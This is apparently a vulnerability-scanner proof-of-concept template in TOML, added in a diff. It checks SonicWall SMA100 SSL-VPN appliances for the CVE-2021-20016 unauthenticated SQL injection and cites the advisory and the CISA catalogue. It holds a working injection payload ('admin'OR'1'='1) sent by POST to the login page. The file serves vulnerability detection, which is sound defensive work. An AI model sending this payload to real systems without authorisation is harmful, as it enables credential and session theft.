@@ -1,0 +1,53 @@
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[info]
+author = "ave"
+description = "通过向 SonicWall SSL-VPN SMA100 登录页面发送含 SQL 注入特征的 POST 请求，验证目标是否存在 CVE-2021-20016 未授权 SQL 注入漏洞。该漏洞允许远程未认证攻击者通过 /web_auth/login.html 执行 SQL 查询获取用户名密码及会话信息，CVSS 3.1 评分 9.8，已被 CISA KEV 目录收录确认在野利用。"
+id = "POC-AVE-2021-0106"
+name = "SonicWall SMA100 SQL Injection Vulnerability PoC"
+severity = "critical"
+tags = ["ave-2021-0106"]
+vuln_id = [
+    "CVE-2021-20016",
+    "AVE-2021-0106",
+]
+
+[meta]
+collected_at = "2026-08-07T00:00:00Z"
+status = "completed"
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/web_auth/login.html"
+protocol = "http"
+
+[poc.requests.body]
+content = "username='admin'OR'1'='1&password=test"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "sma",
+    "dashboard",
+    "logout",
+]
+
+[references]
+urls = [
+    "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0001",
+    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-20016",
+    "https://github.com/ARPSyndicate/suricata-vedas/blob/fe24794ad36564b5bbc7c69101525011387b8650/2021/CVE-2021-20016.rules",
+]
